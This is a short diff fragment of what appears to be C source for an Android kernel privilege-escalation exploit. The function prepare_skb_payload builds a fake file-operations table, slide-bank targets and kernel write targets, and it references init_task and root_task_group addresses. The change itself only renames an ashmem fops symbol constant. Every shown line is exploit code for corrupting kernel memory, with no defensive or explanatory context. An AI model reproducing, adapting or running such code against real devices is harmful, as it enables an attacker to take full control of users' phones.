@@ -632,16 +632,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
     slide_bank_parents[0] = fake_fops;
-    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+    slide_bank_targets[0] = data_addr(ASHMEM_FOPS);
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_right = data_addr(ASHMEM_FOPS);
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
-    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
+    fake_parent = data_addr(ASHMEM_FOPS) - 8;
     fake_right = fake_fops;
     fake_left = payload_base + LEFT_OFF;
     binwrite_target = payload_base + FOPS_OFF + 0x700;
@@ -661,7 +661,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
 
   uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t write_right = data_addr(ASHMEM_FOPS);
   uintptr_t write_left = 0;
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
